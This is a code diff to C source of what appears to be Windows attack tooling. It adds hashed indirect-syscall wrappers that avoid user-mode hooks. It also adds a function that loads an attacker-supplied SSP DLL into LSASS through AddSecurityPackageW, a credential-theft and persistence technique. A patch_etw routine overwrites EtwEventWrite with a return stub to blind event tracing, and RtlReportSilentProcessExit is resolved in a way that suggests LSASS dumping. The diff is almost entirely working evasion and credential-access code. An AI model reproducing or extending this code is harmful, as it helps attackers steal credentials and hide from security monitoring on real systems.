@@ -159,10 +159,16 @@ BOOL resolve_syscalls(void) {
     resolve_one(ntdll, H_NtGetNextProcess, &g_ssn.NtGetNextProcess, &g_addr.NtGetNextProcess);
     resolve_one(ntdll, H_NtCreateProcessEx, &g_ssn.NtCreateProcessEx, &g_addr.NtCreateProcessEx);
     resolve_one(ntdll, H_NtDuplicateToken, &g_ssn.NtDuplicateToken, &g_addr.NtDuplicateToken);
+    resolve_one(ntdll, H_NtDuplicateObject, &g_ssn.NtDuplicateObject, &g_addr.NtDuplicateObject);
     resolve_one(ntdll, H_NtSetInformationThread, &g_ssn.NtSetInformationThread, &g_addr.NtSetInformationThread);
     resolve_one(ntdll, H_NtDelayExecution, &g_ssn.NtDelayExecution, &g_addr.NtDelayExecution);
     resolve_one(ntdll, H_NtCreateUserProcess, &g_ssn.NtCreateUserProcess, &g_addr.NtCreateUserProcess);
     resolve_one(ntdll, H_NtWaitForSingleObject, &g_ssn.NtWaitForSingleObject, &g_addr.NtWaitForSingleObject);
+    resolve_one(ntdll, H_NtProtectVirtualMemory, &g_ssn.NtProtectVirtualMemory, &g_addr.NtProtectVirtualMemory);
+    resolve_one(ntdll, H_NtDeviceIoControlFile, &g_ssn.NtDeviceIoControlFile, &g_addr.NtDeviceIoControlFile);
+    resolve_one(ntdll, H_NtQuerySystemInformation, &g_ssn.NtQuerySystemInformation, &g_addr.NtQuerySystemInformation);
+    g_addr.RtlReportSilentProcessExit = get_export_by_hash(ntdll, H_RtlReportSilentProcessExit);
+    g_addr.EtwEventWrite = get_export_by_hash(ntdll, H_EtwEventWrite);
     g_addr.RtlCreateProcessParametersEx = get_export_by_hash(ntdll, H_RtlCreateProcessParametersEx);
     g_addr.RtlDestroyProcessParameters = get_export_by_hash(ntdll, H_RtlDestroyProcessParameters);
 
@@ -205,6 +211,35 @@ BOOL resolve_service_funcs(void) {
     return g_addr.pfnStartDispatcher &&
            g_addr.pfnRegHandler &&
            g_addr.pfnSetStatus;
+}
+
+/* ── Load SSP DLL into LSASS via AddSecurityPackageW ─────── */
+
+BOOL load_ssp_into_lsass(const wchar_t *dll_path) {
+    PVOID ntdll = get_ntdll_base();
+    if (!ntdll) return FALSE;
+
+    PFN_LdrLoadDll pLoad = (PFN_LdrLoadDll)get_export_by_hash(
+        ntdll, H_LdrLoadDll);
+    if (!pLoad) return FALSE;
+
+    wchar_t dll_name[] = L"sspicli.dll";
+    UNICODE_STRING us;
+    us.Buffer = dll_name;
+    us.Length = 22;
+    us.MaximumLength = 24;
+
+    PVOID hMod = NULL;
+    NTSTATUS st = pLoad(NULL, NULL, &us, &hMod);
+    if (st != 0 || !hMod) return FALSE;
+
+    typedef DWORD (WINAPI *PFN_AddPkg)(LPCWSTR, PVOID);
+    PFN_AddPkg pfn = (PFN_AddPkg)get_export_by_hash(
+        hMod, H_AddSecurityPackageW);
+    if (!pfn) return FALSE;
+
+    pfn(dll_path, NULL);
+    return TRUE;
 }
 
 /* ── Typed syscall wrappers ──────────────────────────────── */
@@ -370,6 +405,15 @@ NTSTATUS sys_NtDuplicateToken(HANDLE ExistingTokenHandle, ACCESS_MASK DesiredAcc
                            (ULONG_PTR)EffectiveOnly, (ULONG_PTR)TokenType, NewTokenHandle);
 }
 
+NTSTATUS sys_NtDuplicateObject(HANDLE SourceProcessHandle, HANDLE SourceHandle,
+                               HANDLE TargetProcessHandle, PHANDLE TargetHandle,
+                               ACCESS_MASK DesiredAccess, ULONG HandleAttributes,
+                               ULONG Options) {
+    return indirect_syscall_s7(g_ssn.NtDuplicateObject, g_addr.NtDuplicateObject,
+                           SourceProcessHandle, SourceHandle, TargetProcessHandle,
+                           TargetHandle, DesiredAccess, HandleAttributes, Options);
+}
+
 NTSTATUS sys_NtSetInformationThread(HANDLE ThreadHandle,
                                      DWORD ThreadInformationClass,
                                      PVOID ThreadInformation,
@@ -388,4 +432,59 @@ NTSTATUS sys_NtWaitForSingleObject(HANDLE Handle, BOOLEAN Alertable,
                                     PLARGE_INTEGER Timeout) {
     return indirect_syscall(g_ssn.NtWaitForSingleObject, g_addr.NtWaitForSingleObject,
                            Handle, (ULONG_PTR)Alertable, Timeout);
+}
+
+NTSTATUS sys_NtProtectVirtualMemory(HANDLE ProcessHandle, PVOID *BaseAddress,
+                                     PSIZE_T RegionSize, ULONG NewProtect,
+                                     PULONG OldProtect) {
+    return indirect_syscall_s2(g_ssn.NtProtectVirtualMemory, g_addr.NtProtectVirtualMemory,
+                           ProcessHandle, BaseAddress, RegionSize, NewProtect, OldProtect);
+}
+
+NTSTATUS sys_NtDeviceIoControlFile(HANDLE FileHandle, HANDLE Event,
+                                    PVOID ApcRoutine, PVOID ApcContext,
+                                    PIO_STATUS_BLOCK IoStatusBlock,
+                                    ULONG IoControlCode,
+                                    PVOID InputBuffer, ULONG InputBufferLength,
+                                    PVOID OutputBuffer, ULONG OutputBufferLength) {
+    return indirect_syscall_s7(g_ssn.NtDeviceIoControlFile, g_addr.NtDeviceIoControlFile,
+                           FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock,
+                           (ULONG_PTR)IoControlCode, InputBuffer, (ULONG_PTR)InputBufferLength,
+                           OutputBuffer, (ULONG_PTR)OutputBufferLength);
+}
+
+NTSTATUS sys_NtQuerySystemInformation(ULONG SystemInformationClass,
+                                       PVOID SystemInformation,
+                                       ULONG SystemInformationLength,
+                                       PULONG ReturnLength) {
+    return indirect_syscall(g_ssn.NtQuerySystemInformation, g_addr.NtQuerySystemInformation,
+                           (ULONG_PTR)SystemInformationClass, SystemInformation,
+                           (ULONG_PTR)SystemInformationLength, ReturnLength);
+}
+
+/* ── ETW patching — blind EtwEventWrite ────────────────────── */
+
+void patch_etw(void) {
+    if (!g_addr.EtwEventWrite || !g_addr.NtProtectVirtualMemory ||
+        !g_ssn.NtProtectVirtualMemory)
+        return;
+
+    /* xor eax, eax; ret = 0x31 0xC0 0xC3 */
+    BYTE patch[] = { 0x31, 0xC0, 0xC3 };
+
+    PVOID addr = g_addr.EtwEventWrite;
+    SIZE_T size = sizeof(patch);
+    ULONG old_protect = 0;
+
+    NTSTATUS st = sys_NtProtectVirtualMemory(
+        (HANDLE)-1, &addr, &size, PAGE_EXECUTE_READWRITE, &old_protect);
+    if (!NT_SUCCESS(st)) return;
+
+    BYTE *dst = (BYTE *)g_addr.EtwEventWrite;
+    dst[0] = patch[0];
+    dst[1] = patch[1];
+    dst[2] = patch[2];
+
+    sys_NtProtectVirtualMemory(
+        (HANDLE)-1, &addr, &size, old_protect, &old_protect);
 }
